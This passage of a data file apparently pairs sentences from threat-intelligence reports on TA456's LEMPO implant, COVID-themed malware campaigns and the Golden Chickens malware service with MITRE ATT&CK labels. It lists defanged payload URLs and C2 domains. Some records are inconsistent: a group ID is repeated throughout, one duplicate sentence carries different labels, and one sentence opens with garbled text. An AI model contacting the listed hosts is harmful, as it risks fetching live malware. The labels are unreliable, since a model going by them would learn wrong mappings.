"proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "The June 2020 version of LEMPO includes\u00a0only\u00a0a connectivity check to ford[.]com.", "labels": [], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "*Figure\u00a03. *After finishing that additional recon, LEMPO moves Logs.txt from %temp% to \\Perflog.", "labels": [], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "LEMPO then checks to ensure the Registry Key previously mentioned has been added and then uses\u00a0the\u00a0findstr\u00a0command\u00a0to\u00a0identify\u00a0files\u00a0containing \u201cuser,\u201d\u00a0\u201cpass,\u201d\u00a0and \u201cvpn.", "labels": ["T1547", "T1005"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "The\u00a0findstr\u00a0command returns any matching lines\u00a0which\u00a0could\u00a0collect usernames and passwords from the computer.", "labels": ["T1005"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "LEMPO\u00a0uses\u00a0hardcoded credentials with\u00a0Microsoft\u2019s\u00a0CDO\u00a0to exfiltrate the information over SMTPS\u00a0on port 465.", "labels": ["T1041"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "In the June 2021 version of LEMPO, TA456 uses the same\u00a0Yahoo email address to send and receive the exfiltrated information.", "labels": ["G0003", "T1071"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "In the 2020 version of LEMPO, TA456 sent from a Yandex account to a\u00a0Tutanota\u00a0email account.", "labels": ["G0003"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "Notably, the Yandex email within the 2020 version of the\u00a0LEMPO\u00a0implant masqueraded as\u00a0large technology company focused on supporting the energy industry.", "labels": [], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "After exfiltrating the information, LEMPO\u00a0sleeps\u00a0for 30\u00a0seconds\u00a0and then\u00a0deletes\u00a0both Logs.txt and Logs.zip.", "labels": ["T1070"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "Besides the Gmail account used for attempted malware delivery, Marcella maintained\u00a0a\u00a0now suspended\u00a0[Facebook profile]", "labels": ["T1566"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "*Figure\u00a04. *Open-source\u00a0research indicates\u00a0\u201cMarcella\u201d interacted with TA456\u2019s target on social media starting in late 2019.", "labels": ["G0003"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "TA456 routinely conducts reconnaissance campaigns\u00a0disguised as news related spam\u00a0that target individuals employed by\u00a0aerospace\u00a0defense contractors.", "labels": ["G0003", "T1566"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "Additionally,\u00a0Proofpoint has observed\u00a0TA456\u00a0targeting\u00a0individuals\u00a0employed at\u00a0multiple\u00a0subcontractors\u00a0and subsidiaries of larger defense companies.", "labels": ["G0003"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "This is consistent with TA456\u2019s TTP of\u00a0targeting business\u00a0and\u00a0information technology-related individuals\u00a0within their target\u00a0organization.", "labels": ["G0003"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "Proofpoint attributes this campaign to TA456, an Iranian-aligned adversary focused on espionage efforts against\u00a0defense\u00a0industrial\u00a0base employees and contractors, particularly those supporting efforts in the Middle East.", "labels": ["G0003"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "TA456 overlaps with activity tracked as Tortoiseshell,\u00a0and\u00a0Imperial Kitten.", "labels": ["G0003", "G0003", "G0003"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "Additionally,\u00a0LEMPO\u00a0shares multiple similarities with\u00a0[Tortoiseshell\u2019s\u00a0Liderc](https://blog.talosintelligence.com/2019/09/tortoiseshell-fake-veterans.html), including extensive machine reconnaissance, exfiltration via email, hardcoded email addresses with similar formatting, and overall pattern of targeting companies and individuals aligned with the American defense industrial base.", "labels": [], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "TA456 demonstrated a significant operational investment by cultivating a relationship with a\u00a0target\u2019s\u00a0employee over\u00a0years\u00a0in order to\u00a0deploy LEMPO to conduct reconnaissance into a highly secured target\u00a0environment within the defense industrial base.", "labels": ["G0003"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "Facebook\u2019s\u00a0announcement\u00a0demonstrated\u00a0TA456 had established an extensive network of these personas\u00a0dedicated\u00a0to\u00a0enabling cyberespionage operations.", "labels": ["G0003"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "While Proofpoint did not observe\u00a0the\u00a0delivery\u00a0of\u00a0any remote access trojans or\u00a0command and control\u00a0channels\u00a0like\u00a0TA456\u2019s\u00a0[Syskit](https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/tortoiseshell-apt-supply-chain),\u00a0the information potentially gathered by LEMPO\u00a0could be operationalized in a variety of ways.", "labels": ["TA0011", "G0003"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "These include\u00a0the utilization of stolen VPN credentials, exploitation of vulnerabilities in the identified software, or the customization of\u00a0more advanced\u00a0malware delivered from\u00a0\u201cMarcella.", "labels": ["T1203"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "TA456\u2019s\u00a0dedication to significant\u00a0social engineering\u00a0engagement,\u00a0benign\u00a0reconnaissance of targets prior to deploying malware,\u00a0and\u00a0their cross platform kill chain\u00a0establish\u00a0TA456\u00a0to be one of the most\u00a0resourceful\u00a0Iranian-aligned threats tracked by Proofpoint.", "labels": ["G0003", "G0003"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "TA456\u2019s\u00a0dedication to significantsocial engineering\u00a0engagement,\u00a0benign\u00a0reconnaissance of targets prior to deploying malware,\u00a0and\u00a0their cross platform kill chain\u00a0establish\u00a0TA456\u00a0to be one of the most\u00a0resourceful\u00a0Iranian-aligned threats tracked by Proofpoint.", "labels": ["T1566"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "The \u201cMarcella Flores\u201d persona is likely\u00a0not the only\u00a0one in use by TA456, making it important for\u00a0those working within or tangentially to the defense industrial base\u00a0to be vigilant\u00a0when engaging with\u00a0unknown\u00a0individuals regardless of whether it is via work or personal accounts.", "labels": ["G0003"], "document": "proofpoint_2021-07-28_i-knew-you-were-trouble"}, {"sentence": "As Delta Variant Spreads, COVID-19 Themes Make Resurgence In Email Threats", "labels": ["T1566"], "document": "proofpoint_2021-08-24_delta-variant-spreads-covid-19"}, {"sentence": "* Proofpoint researchers observed high-volume COVID-19 related campaigns from malware including\u00a0RustyBuer, Formbook,\u00a0and Ave Maria.", "labels": [], "document": "proofpoint_2021-08-24_delta-variant-spreads-covid-19"}, {"sentence": "TA542, known\u00a0to distribute\u00a0Emotet, first began using COVID-19 in email threats in January 2020.", "labels": ["S0367", "T1566"], "document": "proofpoint_2021-08-24_delta-variant-spreads-covid-19"}, {"sentence": "Since late June 2021, Proofpoint has observed high volume COVID-19 themed campaigns distributing\u00a0RustyBuer, Formbook, and\u00a0Ave Maria malware, in addition to multiple corporate phishing\u00a0attempts\u00a0to steal Microsoft\u00a0and O365 credentials.", "labels": ["T1056"], "document": "proofpoint_2021-08-24_delta-variant-spreads-covid-19"}, {"sentence": "The messages contained\u00a0a URL which likely leads to a fake Microsoft authentication page designed to harvest user credentials.", "labels": ["T1566", "T1056"], "document": "proofpoint_2021-08-24_delta-variant-spreads-covid-19"}, {"sentence": "Proofpoint researchers observed a new high-volume\u00a0Formbook\u00a0campaign sent to\u00a0hundreds of\u00a0organizations masquerading as a\u00a0human resource\u00a0professional.", "labels": [], "document": "proofpoint_2021-08-24_delta-variant-spreads-covid-19"}, {"sentence": "The emails\u00a0contain a zipped file(e.g.\u00a0Scan.Salary.zip)\u00a0and\u00a0tell the recipients\u00a0that\u00a0their jobs are being eliminated due to\u00a0the financial impact of\u00a0COVID-19.", "labels": ["T1566"], "document": "proofpoint_2021-08-24_delta-variant-spreads-covid-19"}, {"sentence": "To further entice the recipient to open the malicious file, the email states a \u201c2\u00a0months\u00a0salary receipt\u201d is attached.", "labels": ["T1566"], "document": "proofpoint_2021-08-24_delta-variant-spreads-covid-19"}, {"sentence": "The emails contain a malicious\u00a0.ZIP\u00a0attachment, that when\u00a0extracted and\u00a0executed leads to the installation of Formbook malware.", "labels": ["T1566", "T1204"], "document": "proofpoint_2021-08-24_delta-variant-spreads-covid-19"}, {"sentence": "### Ave Maria", "labels": [], "document": "proofpoint_2021-08-24_delta-variant-spreads-covid-19"}, {"sentence": "Proofpoint researchers\u202fidentified new Ave Maria\u00a0malware campaigns largely targeting energy and industrial organizations.", "labels": [], "document": "proofpoint_2021-08-24_delta-variant-spreads-covid-19"}, {"sentence": "Ave Maria is a remote access trojan, written in C++, that is capable of process and file system manipulation, command shell access, webcam control, keylogging, password theft, and remote desktop access.", "labels": ["T1565", "T1059", "T1125", "T1056", "TA0006", "TA0011"], "document": "proofpoint_2021-08-24_delta-variant-spreads-covid-19"}, {"sentence": "The contents of the\u202femails\u202fclaimed there was\u202fnew COVID-19\u202fpreventative measures\u202fincluded in the attachment.", "labels": ["T1566"], "document": "proofpoint_2021-08-24_delta-variant-spreads-covid-19"}, {"sentence": "The following week, Proofpoint\u00a0observed additional\u00a0Ave Maria\u00a0campaigns\u00a0distributing COVID-19 themed messages, for example:\u00a0", "labels": [], "document": "proofpoint_2021-08-24_delta-variant-spreads-covid-19"}, {"sentence": "All the observed Ave Maria COVID-19 themed messages contained an Excel attachment that exploits various Equation Editor vulnerabilities.", "labels": ["T1059"], "document": "proofpoint_2021-08-24_delta-variant-spreads-covid-19"}, {"sentence": "The malware\u2019s command and control infrastructure utilized\u00a0Dynamic\u00a0DNS and communication over port 5200.", "labels": ["TA0011"], "document": "proofpoint_2021-08-24_delta-variant-spreads-covid-19"}, {"sentence": "### RustyBuer", "labels": [], "document": "proofpoint_2021-08-24_delta-variant-spreads-covid-19"}, {"sentence": "Currently, one of the most\u00a0active COVID-19 related threats is\u00a0RustyBuer, a\u00a0new Rust-based\u00a0Buer\u00a0Loader strain\u00a0[first identified](https://www.proofpoint.com/us/blog/threat-insight/new-variant-buer-loader-written-rust)\u00a0by Proofpoint researchers in April 2021.", "labels": [], "document": "proofpoint_2021-08-24_delta-variant-spreads-covid-19"}, {"sentence": "[Buer](https://malpedia.caad.fkie.fraunhofer.de/details/win.buer)\u202fis a downloader\u00a0 that is used as a foothold in compromised networks\u00a0& an \u2018Initial Access Broker\u2019 to\u00a0distribute other\u00a0secondary payloads\u202f[including ransomware](https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-006.pdf).", "labels": ["T1486", "TA0001"], "document": "proofpoint_2021-08-24_delta-variant-spreads-covid-19"}, {"sentence": "Historically, threat actors leveraging\u00a0Buer\u00a0and\u00a0RustyBuer\u00a0generally did not use COVID-19 themes; the virus theme was previously observed once associated with this malware in November 2020.", "labels": [], "document": "proofpoint_2021-08-24_delta-variant-spreads-covid-19"}, {"sentence": "COVID-19 infections at higher than Covid and rubbed his restaurants and\u00a0COVID-19 vaccinations for its mask mandate for the ongoing disaster which\u00a0The observed\u00a0messages contain\u00a0password protected zipped\u00a0Microsoft Excel attachments with macros which, if enabled, will\u00a0download\u00a0and execute\u00a0RustyBuer.", "labels": ["T1566", "T1204"], "document": "proofpoint_2021-08-24_delta-variant-spreads-covid-19"}, {"sentence": "*Figure\u00a05. COVID-19 themed lure distributing\u00a0RustyBuer.*", "labels": [], "document": "proofpoint_2021-08-24_delta-variant-spreads-covid-19"}, {"sentence": "| http://sweetdreambymoon[.]stars[.]bz/a2/p3.exe\u202f\u00a0 | Ave Maria / Warzone\u202fPayload URL\u202f\u00a0 |", "labels": [], "document": "proofpoint_2021-08-24_delta-variant-spreads-covid-19"}, {"sentence": "| warzonlogs[.]duckdns[.]org\u202f\u00a0 | Ave Maria / Warzone C2\u202f\u00a0 |", "labels": ["TA0011"], "document": "proofpoint_2021-08-24_delta-variant-spreads-covid-19"}, {"sentence": "| admin@ledfarm[.]store\u202f\u00a0 | Ave Maria\u00a0Sender Email\u202f\u00a0 |", "labels": [], "document": "proofpoint_2021-08-24_delta-variant-spreads-covid-19"}, {"sentence": "| contact@wmbtole-com[.]uno\u202f\u00a0 | Ave Maria\u00a0Sender Email\u202f\u00a0 |", "labels": [], "document": "proofpoint_2021-08-24_delta-variant-spreads-covid-19"}, {"sentence": "| contact@yumaletab-net[.]uno\u202f\u00a0 | Ave Maria\u00a0Sender Email\u202f\u00a0 |", "labels": [], "document": "proofpoint_2021-08-24_delta-variant-spreads-covid-19"}, {"sentence": "| \u202finfo@taxpunishdep[.]com\u00a0 | RustyBuer\u00a0Sender Email\u00a0 |", "labels": [], "document": "proofpoint_2021-08-24_delta-variant-spreads-covid-19"}, {"sentence": "| info@loveshipper[.]com\u00a0 | RustyBuer\u00a0Sender Email\u00a0 |", "labels": [], "document": "proofpoint_2021-08-24_delta-variant-spreads-covid-19"}, {"sentence": "\u00a0 | RustyBuer\u00a0Document Payload\u00a0 |", "labels": [], "document": "proofpoint_2021-08-24_delta-variant-spreads-covid-19"}, {"sentence": "| cerionetya[.]com\u00a0 | RustyBuer\u00a0C2\u00a0 |", "labels": ["TA0011"], "document": "proofpoint_2021-08-24_delta-variant-spreads-covid-19"}, {"sentence": "\u00a0 | RustyBuer\u00a0Hash (Sample)\u00a0 |", "labels": [], "document": "proofpoint_2021-08-24_delta-variant-spreads-covid-19"}, {"sentence": "| info@deliverydhlexpress[.]com\u00a0 | RustyBuer\u00a0Sender Email\u00a0 |", "labels": [], "document": "proofpoint_2021-08-24_delta-variant-spreads-covid-19"}, {"sentence": "| info@deliveryeatstreet[.]com\u00a0 | RustyBuer\u00a0Sender Email\u00a0 |", "labels": [], "document": "proofpoint_2021-08-24_delta-variant-spreads-covid-19"}, {"sentence": "| https://seryanjek[.]com/api/v3/disambiguate/nonequivalent/ditrigonal\u00a0 | RustyBuer\u00a0Document Payload\u00a0 |", "labels": [], "document": "proofpoint_2021-08-24_delta-variant-spreads-covid-19"}, {"sentence": "| e3a11be133a98c05ab7aa90f7ca8037cfdad66b0159b5522a85dab5d54f6eb71\u00a0 | RustyBuer\u00a0Hash (Sample)\u00a0 |", "labels": [], "document": "proofpoint_2021-08-24_delta-variant-spreads-covid-19"}, {"sentence": "| info@covidhospitalgeer[.]com\u00a0 | RustyBuer\u00a0Sender Email\u00a0 |", "labels": [], "document": "proofpoint_2021-08-24_delta-variant-spreads-covid-19"}, {"sentence": "| info@covidadministration[.]com\u00a0 | RustyBuer\u00a0Sender Email\u00a0 |", "labels": [], "document": "proofpoint_2021-08-24_delta-variant-spreads-covid-19"}, {"sentence": "| info@covidbooksinfo[.]com\u00a0 | RustyBuer\u00a0Sender Email\u00a0 |", "labels": [], "document": "proofpoint_2021-08-24_delta-variant-spreads-covid-19"}, {"sentence": "| info@discountfreeals[.]com\u00a0 | RustyBuer\u00a0Sender Email\u00a0 |", "labels": [], "document": "proofpoint_2021-08-24_delta-variant-spreads-covid-19"}, {"sentence": "| lebatyo[.]com\u00a0 | RustyBuer\u00a0C2\u00a0 |", "labels": ["TA0011"], "document": "proofpoint_2021-08-24_delta-variant-spreads-covid-19"}, {"sentence": "| https://hejoysa[.]com/ssl/v1/getkey\u00a0 | RustyBuer\u00a0Excel Payload\u00a0 |", "labels": [], "document": "proofpoint_2021-08-24_delta-variant-spreads-covid-19"}, {"sentence": "| eurolord.duckdns[.]org\u00a0 | Ave Maria C2\u00a0 |", "labels": ["TA0011"], "document": "proofpoint_2021-08-24_delta-variant-spreads-covid-19"}, {"sentence": "| 6b4a4244409dc7dd0e538b98fbb886b51d626202bdc8501af5c9c4e84daecd82\u00a0 | Ave Maria Hash (Sample)\u00a0 |", "labels": [], "document": "proofpoint_2021-08-24_delta-variant-spreads-covid-19"}, {"sentence": "| http://sassyladywrites[.]com/a1/b7[.]exe\u00a0 | Ave Maria Payload URL\u00a0 |", "labels": [], "document": "proofpoint_2021-08-24_delta-variant-spreads-covid-19"}, {"sentence": "| https://00f74ba44bd85135df3aa07960343eeeec89e0088b-apidata[.]googleusercontent[.]com/download/storage/v1/b/dhngw6p6rwrwnuv6vnuse.appspot.com/o/index.html\u00a0 | Microsoft Credential Theft Phishing Landing Page\u00a0 |", "labels": ["T1056"], "document": "proofpoint_2021-08-24_delta-variant-spreads-covid-19"}, {"sentence": "| https://storage[.]cloud[.]google[.]com/dhngw6p6rwrwnuv6vnuse.appspot.com/index.html#username@organizationname.tld\u00a0 | Microsoft Credential Theft Phishing URL\u00a0 |", "labels": ["T1056"], "document": "proofpoint_2021-08-24_delta-variant-spreads-covid-19"}, {"sentence": "| 24cf6db04d0882f124750e4b7025455d11b02f23ad088a334e449a82d672e64a\u00a0 | Formbook\u00a0Hash\u00a0(Scan.Salary.zip)\u00a0 |", "labels": [], "document": "proofpoint_2021-08-24_delta-variant-spreads-covid-19"}, {"sentence": "| www.aozhengaodi[.]com/bkbk/\u00a0 | Formbook C2\u00a0 |", "labels": ["TA0011"], "document": "proofpoint_2021-08-24_delta-variant-spreads-covid-19"}, {"sentence": "Proofpoint researchers\u202fin the\u00a0[sixth](/us/blog/threat-insight/bec-taxonomy-gift-carding \"BEC Taxonomy: Gift Carding \")\u00a0of\u202fthe\u202f[Business Email Compromise](/us/threat-reference/business-email-compromise \"Business Email Compromise (BEC)\")\u202f(BEC) taxonomy series explored\u00a0the gift carding\u00a0theme from the Email Fraud Taxonomy framework (Figure 1).", "labels": ["T1566"], "document": "proofpoint_2021-08-31_bec-taxonomy-advance-fee-fraud"}, {"sentence": "*Figure 1. Email Fraud Taxonomy Framework.*", "labels": ["T1566"], "document": "proofpoint_2021-08-31_bec-taxonomy-advance-fee-fraud"}, {"sentence": "### Advance Fee Fraud\u00a0and the Email Fraud Taxonomy Framework", "labels": ["T1566"], "document": "proofpoint_2021-08-31_bec-taxonomy-advance-fee-fraud"}, {"sentence": "Advance Fee\u00a0Fraud\u00a0leverages impersonation from the Deception layer of the Email Fraud Taxonomy.", "labels": ["T1566"], "document": "proofpoint_2021-08-31_bec-taxonomy-advance-fee-fraud"}, {"sentence": "Advance Fee Fraud\u00a0emails\u00a0use\u00a0a variety of lures to convince\u00a0recipients\u00a0of their legitimacy and to entice them to follow through on the request.", "labels": ["T1566"], "document": "proofpoint_2021-08-31_bec-taxonomy-advance-fee-fraud"}, {"sentence": "Most Advance Fee Fraud emails are\u00a0simple and easy to spot as fraudulent\u00a0with few being well-crafted and more complex than the examples provided above.", "labels": ["T1566"], "document": "proofpoint_2021-08-31_bec-taxonomy-advance-fee-fraud"}, {"sentence": "While Advance Fee only makes up a small fraction of the fraud emails Proofpoint researchers see in a day, the average loss can still be about\u00a0$5,100 per incident\u00a0when someone does fall for them.", "labels": ["T1566"], "document": "proofpoint_2021-08-31_bec-taxonomy-advance-fee-fraud"}, {"sentence": "Golden Chickens: Uncovering a Malware-as-a-Service (MaaS) Provider", "labels": [], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "Over the last few years, [QuoIntelligence](https://quointelligence.eu/) (QuoINT) has tracked activities attributed to the Cobalt group, and observed their notable evolution and continuously improving Tactics, Techniques, and Procedures (TTPs).", "labels": ["G0080"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "Since September 2018, we have identified multiple attacks that share similar TTPs used by Cobalt during a specific timeframe but exhibit enough differenced to attribute them to separate threat actors.", "labels": ["G0080"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "It also provides details on two different threat actors using the MaaS that fall under the umbrella of a family we dubbed *Golden Chickens*: GC01 and GC02.", "labels": [], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "The success of Golden Chickens (GC) operations heavily relies on a specific MaaS sold in underground forums, which provides customers with the malwares and the infrastructure they need for targeted attacks.", "labels": [], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "The service owner provides the MaaS through the use of the following toolkits: Venom and Taurus building kits for crafting documents used to deliver the attack, and the more\\_eggs (aka Terra Loader, [SpicyOmelette](https://www.secureworks.com/blog/cybercriminals-increasingly-trying-to-ensnare-the-big-financial-fish)) backdoor for taking full control of the infected computer.", "labels": ["T1566"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "Between November 2017 and July 2018, we attributed to GC02 five spear phishing waves which indiscriminately targeted companies and organizations in at least India and the United States.", "labels": ["T1566"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "As a result of using the same MaaS provider, GC02 and Cobalt group\u2019s TTPs and infrastructure strongly overlapped in May 2018, making it hard at first glance to differentiate the two threat actors.", "labels": ["G0080"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "Between August and October 2018, we attributed to GC01 nine spear phishing waves targeting multiple companies and organizations operating in the financial industry.", "labels": ["T1566"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "By highlighting the multi-layer infrastructure adopted by Cobalt and Golden Chickens, as well as the multi-client business model of the MaaS behind it, we emphasize the difficulty of performing reliable attribution for cyberattacks, and the high uncertainty that analysts are confronted with during the process.", "labels": ["G0080"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "To note, other [researchers](https://researchcenter.paloaltonetworks.com/2018/10/unit42-new-techniques-uncover-attribute-cobalt-gang-commodity-builders-infrastructure-revealed/) reported the same Indicators of Compromise (IoC) and C2 infrastructure covered in this blog post.", "labels": ["TA0011"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "Especially for e-Crime actors, it is a common practice to rent the same bulletproof infrastructure or botnet used by other e-Crime groups, resulting in the increased likelihood for an overlap of C2 servers.", "labels": ["TA0011", "T1588"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "A threat actor can buy several malware from multiple developers, rent the C2 infrastructure from various providers, and deliver the attack vector to victims from yet another provider.", "labels": ["TA0011", "T1588", "T1583"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "When profiling e-Crime threat actors, we always deal with the hypothesis that the malware and C2 infrastructure we are analyzing do not belong to the threat actor *per se*, but rather to the used MaaS provider.", "labels": ["TA0011"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "By using such an approach, we were able to differentiate past spear phishing campaigns mistakenly attributed to the Cobalt group and characterize two distinct threat actors \u2014 GC01 and GC02 \u2014 and the MaaS used by them to carry out their attacks.", "labels": ["G0080", "T1566"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "Golden Chickens\u2019 MaaS", "labels": [], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "From November 2017 to October 2018, we attributed 14 campaigns to the Golden Chickens (GC) threat actors that used a specific MaaS provider (hereinafter \u201c*the Provider*\u201d) offered by a known individual (hereinafter *\u201cthe Provider Operator\u201d*).", "labels": [], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "2.The Provider Operator builds the malicious document (maldoc), the backdoor, and prepares the server infrastructure needed for the execution of the attack.", "labels": ["T1566", "T1583"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "Next, the backdoor is stored on a webserver and the full URL path of it is embedded into the maldoc. Lastly, the C2 panel that the backdoor will beacon to is set up.", "labels": ["TA0011", "T1105", "TA0011"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "Although not confirmed, the Provider Operator also likely delivers the access details for the backdoor\u2019s C2 web panel.", "labels": ["TA0011"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "4.The threat actor disseminates (directly or through the use of a botnet) the maldoc via spear phishing.", "labels": ["T1566"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "5.Once the maldoc is executed on a victim\u2019s machine, it will retrieve and execute the backdoor from the hardcoded web location.", "labels": ["T1204", "T1105"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "6.The backdoor beacons to the hardcoded C2 on a regular basis and executes the commands it receives.", "labels": ["TA0011", "TA0002", "TA0011", "TA0011"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "7.Finally, the threat actor (or the Provider) will review the system details of the infected machine reported by the backdoor, and eventually deploy the final payload.", "labels": ["T1082"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "Those artifacts are generated by three building kits and offered to paying customers with the supporting C2 infrastructure.", "labels": ["TA0011"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "**VenomKit.** VenomKit is a tool that threat actors can use to craft malicious Rich Text File (RTF) documents that exploit multiple vulnerabilities, including CVE-2017\u201311882, CVE-2018\u20130802, and CVE-2018\u20138174.", "labels": ["T1566", "T1203"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "Successful exploitation leads to batch and scriptlet files being dropped and executed in order to download the second stage payload from a Web resource.", "labels": ["T1059", "T1105"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "The AV detection rate for RTF documents generated by VenomKit is *moderate* to *high* due to the exploitation of known vulnerabilities.", "labels": ["T1203"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "**Taurus Builder Kit.** The Taurus Builder Kit generates Microsoft Word documents weaponized with malicious Visual Basic for Application (VBA) macro code.", "labels": ["T1059"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "Unlike the malicious RTFs created by VenomKit, the weaponized Word documents require user interaction in order to enable the contained malicious code.", "labels": ["T1566", "T1059", "T1204"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "On the other hand, documents generated by this kit are more resilient to AV detection due to the use of multiple layers of obfuscation in the VBA code.", "labels": ["T1059", "T1027"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "Once the VBA code is enabled by the user, documents created by Taurus Builder Kit will download and execute additional malware by using multiple legit Windows tools in order to bypass AppLocker.", "labels": ["T1059", "T1204", "T1105"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "**More\\_Eggs Backdoor.** More\\_eggs is a JavaScript (JS) backdoor capable of beaconing to a fixed C2 server and executing additional payloads downloaded from an external Web resource.", "labels": ["T1059", "TA0011", "T1105"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "The backdoor is delivered encrypted inside of another JavaScript, with changing function names, variable names, and encryption keys.", "labels": ["T1059"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "The more\\_eggs building kit allows customization of its multiple variables, for values such as the C2 server, beaconing and sleeping time, and part of the cryptographic key used for ciphering the C2 communications.", "labels": ["TA0011", "TA0011", "T1573"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "Figure 3 shows an example of more\\_eggs configuration that includes the version number *BV*, C2 address *Gate*, and part of the ciphering key used to encrypt C2 communications, *Rkey*.", "labels": ["TA0011", "TA0011", "T1573"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "For instance, more\\_eggs samples attributed to GC02 contained the extra variable *Researchers,* differently from the ones attributed to GC01 or Cobalt Group.", "labels": ["G0080"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "Although not confirmed, it is reasonable to assume that multiple more\\_eggs used by different threat actors cannot share the same *Gate* value due to the derived complication that would imply for the backend to understand which C2 communications belong to which threat actor using the infrastructure.", "labels": ["TA0011"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "However, the same C2 server can host multiple gates by using different web pages; hence, multiple threat actors might use distinct gates hosted on the same domain name.", "labels": ["TA0011", "G0080"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "The following section highlights the operations and TTPs of three distinct threat actors that have used the Provider in the last year: the Cobalt Group, GC01 and GC02.", "labels": ["G0080"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "Figure 4 represents the multiple spear phishing campaigns we have attributed to either Cobalt[1] or the Golden Chickens (GC) family during the last year.", "labels": ["T1566", "G0080"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "While all GC campaigns used the Provider, only those attributed to Cobalt in May, June, and on 2 August used the Provider.", "labels": [], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "Figure 4 \u2014 Timeline analysis of attacks conducted by GC family and Cobalt Group", "labels": ["G0080"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "In May 2018, Cobalt executed three different spear phishing campaigns in between two GC02 campaigns.", "labels": ["G0080", "T1566"], "document": "quoteintelligence_2018-11-29_golden-chickens-uncovering-a-malware"}, {"sentence": "The attacks leveraged the same Provider since they used maldocs generated by 